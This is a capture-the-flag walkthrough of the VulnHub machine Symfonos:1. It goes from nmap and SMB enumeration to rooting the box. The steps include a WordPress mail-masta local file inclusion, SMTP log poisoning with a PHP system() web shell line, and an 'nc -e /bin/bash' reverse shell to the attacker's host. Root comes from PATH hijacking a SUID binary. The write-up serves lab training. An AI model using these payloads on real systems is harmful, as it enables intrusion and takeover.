Target: 10.0.0.31
Difficulty: Medium
Source: https://www.vulnhub.com/entry/symfonos-1,322/

Before scanning the machine, the creator said that we may need to update our host file to 'symfonos.local', so we add '10.0.0.31 symfonos.local' to the hosts file.

## *NMAP*

    nmap -sS -T4 -p- 10.0.0.31

    PORT    STATE SERVICE
    22/tcp  open  ssh
    25/tcp  open  smtp                                                                                        
    80/tcp  open  http                                                                                        
    139/tcp open  netbios-ssn                                                                                 
    445/tcp open  microsoft-ds

We have 5 open ports. Let's start by enumerating SAMBA.

## *SMB*

    smbclient -L //10.0.0.31/
    Enter WORKGROUP\root's password:                                                                          

            Sharename       Type      Comment
            ---------       ----      -------
            print$          Disk      Printer Drivers
            helios          Disk      Helios personal share
            anonymous       Disk      
            IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
>
    smbclient //10.0.0.31/helios

![image](https://user-images.githubusercontent.com/76552238/158071175-3b24fab1-dd5b-424f-b747-ca995632da4b.png)

We don't have access to the share 'helios' because we don't have a password for the user 'helios, yet. This means there is a user named 'helios' on the machine. Let's try the share 'anonymous'.

    smbclient //10.0.0.31/anonymous

![image](https://user-images.githubusercontent.com/76552238/158071296-80f6db83-2c55-491d-a00a-ad05a07c565d.png)

By going to the anonymous share we can read the ***attention.txt*** file:

    Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

    Next person I find using one of these passwords will be fired!

    -Zeus


Now that we have some passwords let's try accessing 'helios' share with the user 'helios'.
For some reason I couldn't brute force the SMB shares using 'hydra' or any other brute forcing tools so I checked the passwords manually, since there were only 3. 'qwerty' is the correct password for the 'helio's share.

    smbclient //10.0.0.31/helios -U helios

![image](https://user-images.githubusercontent.com/76552238/158071644-618e862d-ef8f-4a3b-8b4a-1079e15532b3.png)

Once again we can download the files to our local machines and read them.

### ***todo.txt:***

    1. Binge watch Dexter
    2. Dance
    3. Work on /h3l105
   
>

### ***research.txt:***

    Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.

The research.txt file doesn't have any useful information but the todo list shows us the there is a directory on the webserver named "h3l105".

## *HTTP*

![image](https://user-images.githubusercontent.com/76552238/158071758-6b585431-2727-4300-b9da-d097ce28793f.png)

After going to http://symfonos.local/h3l105/ we can see it's running on Wordpress. We can use the tool 'wpscan'.

    wpscan --url http://symfonos.local/h3l105/ --enumerate ap,vt,u

"wpscan" found some really useful information, the user 'admin' is available. I tried brute forcing the password but it didn't work. 

![image](https://user-images.githubusercontent.com/76552238/158071900-0356b4cc-b495-415d-b9ff-def927689d6a.png)

We also found that the site has 2 plugins:

![image](https://user-images.githubusercontent.com/76552238/158071879-6e5f498c-4df7-4ae5-83d8-3d22f0bbde7e.png)

site-editor
mail-masta

After searching around for a bit, I found an exploit for the 'mail-masta' plugin.

[root@kali ~/D/C/SYMFONOS#1# searchsploit -m php/webapps/40290.txt](https://www.exploit-db.com/exploits/40290)

Turns out 'mail-masta' is vulnerable to LFI (When an application uses a file path as an input, some sites treats that input as trusted and safe. A local file can then be injected into the included statement).

### ***40290.txt:***

    [+] Date: [23-8-2016]
    [+] Autor Guillermo Garcia Marcos
    [+] Vendor: https://downloads.wordpress.org/plugin/mail-masta.zip
    [+] Title: Mail Masta WP Local File Inclusion
    [+] info: Local File Inclusion

    The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.

    Source: /inc/campaign/count_of_send.php
    Line 4: include($_GET['pl']);

    Source: /inc/lists/csvexport.php:
    Line 5: include($_GET['pl']);

    Source: /inc/campaign/count_of_send.php
    Line 4: include($_GET['pl']);

    Source: /inc/lists/csvexport.php
    Line 5: include($_GET['pl']);

    Source: /inc/campaign/count_of_send.php
    Line 4: include($_GET['pl']);

    Typical proof-of-concept would be to load the passwd file:

    http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

Going to **http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd**,
we can see that the user "helios" is a user on the machine.

    root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false Debian-exim:x:105:109::/var/spool/exim4:/bin/false messagebus:x:106:111::/var/run/dbus:/bin/false sshd:x:107:65534::/run/sshd:/usr/sbin/nologin helios:x:1000:1000:,,,:/home/helios:/bin/bash mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false postfix:x:109:115::/var/spool/postfix:/bin/false 

At this point I got a little stuck, I searched online for "Local File Inclusion remote command execution" and found out that if we can upload to a file on the machine this php script ---> <?php system($_GET['c']); ?> we can perform remote code execution on the machine. I went back to the NMAP scan and saw port 25 is open, maybe we can send a mail and open it using the Local File Inclusion exploit and perform remote execution.

    telnet 10.0.0.31 25

    Status: 220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
    Sent: mail from: <hacker>
    Status: 250 2.1.0 Ok
    Sent: rcpt to: helios@symfonos.localdomain
    Status: 250 2.1.5 Ok
    Sent: data
    Status: 354 End data with <CR><LF>.<CR><LF>
    Sent: <?php system($_GET['c']); ?>
    Sent: .
    Status: 250 2.0.0 Ok: queued as 9A174408A4

Going to http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios we can read our sent email.

By setting a listener on our local machine we can get a reverse shell on the remote machine.

### **Local machine:**

    nc -lnvp 4444

    ![image](https://user-images.githubusercontent.com/76552238/158072352-e35b1621-ad8a-4ba0-a3ee-8d03cafae669.png)

>

### **Remote Machine:** 

    symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc -e /bin/bash 10.0.0.27 4444

We are logged in as the user 'helios'.

![image](https://user-images.githubusercontent.com/76552238/158072406-1f4933e7-fd4d-4469-8afe-34e84be83d6d.png)

Going to the home folder there is only the share that we already enumerated on Samba.

![image](https://user-images.githubusercontent.com/76552238/158072432-d3490c61-2cb3-4514-b9e6-7813884b51fc.png)

![image](https://user-images.githubusercontent.com/76552238/158072444-0c45aa8a-ade8-4716-844b-d731fdbdf33c.png)

Let's try to find SUID files.

    find / -perm /4000 2> /dev/null

![image](https://user-images.githubusercontent.com/76552238/158072467-c93be0a2-488c-488a-96a1-44f6dfc2ea77.png)

There is one odd file ---> /opt/statuscheck.  

    /opt/statuscheck

    HTTP/1.1 200 OK
    Date: Thu, 03 Feb 2022 16:51:56 GMT
    Server: Apache/2.4.25 (Debian)
    Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT
    ETag: "148-58c6b9bb3bc5b"
    Accept-Ranges: bytes
    Content-Length: 328
    Vary: Accept-Encoding
    Content-Type: text/html

After running the command it seems to be outputting a response from a  webserver, probably by using the "curl" command. Let's see if is has any hidden strings.

    strings /opt/statuscheck

![image](https://user-images.githubusercontent.com/76552238/158072628-aebb4587-6592-4131-b81f-77a21a5a98f7.png)

We can confirm that the "curl" command is being used. We can try to change the PATH variable and create a file name curl that opens a new shell.

    echo '/bin/bash' >> /tmp/curl

    chmod +x /tmp/curl

    export PATH=/tmp:$PATH

    /opt/statuscheck

![image](https://user-images.githubusercontent.com/76552238/158072825-0e973837-5965-47ac-840b-8412f48067a5.png)

We can go the 'root' directory and read the ***proof.txt*** file.

### **/root/proof.txt:***

            Congrats on rooting symfonos:1!

                    \ __
    --==/////////////[})))==*
                    / \ '          ,|
                        `\`\      //|                             ,|
                        \ `\  //,/'                           -~ |
    )             _-~~~\  |/ / |'|                       _-~  / ,
    ((            /' )   | \ / /'/                    _-~   _/_-~|
    (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
    ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
    ((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
    ((\~\           |    )   | '      /        __--~~  \-~~ _-~
        `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
        (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
        ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                    ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                    ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                    ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                    ;;;;'     (      ---~~/         `:::|       `\\.      
                    |'  _      `----~~~~'      /      `:|        ()))),      
                ______/\/~    |                 /        /         (((((())  
            /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
            / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
            //  \ \                        /  |  \;;,\                 `   
        (<_    \ \                    /',/-----'  _> 
            \_|     \\_                 //~;~~~~~~~~~ 
                    \_|               (,~~   
                                        \~\
                                        ~~

            Contact me via Twitter @zayotic to give feedback!

![image](https://user-images.githubusercontent.com/76552238/158072858-3b5a4839-6e3e-4215-95c4-0fe20c1880f7.png)
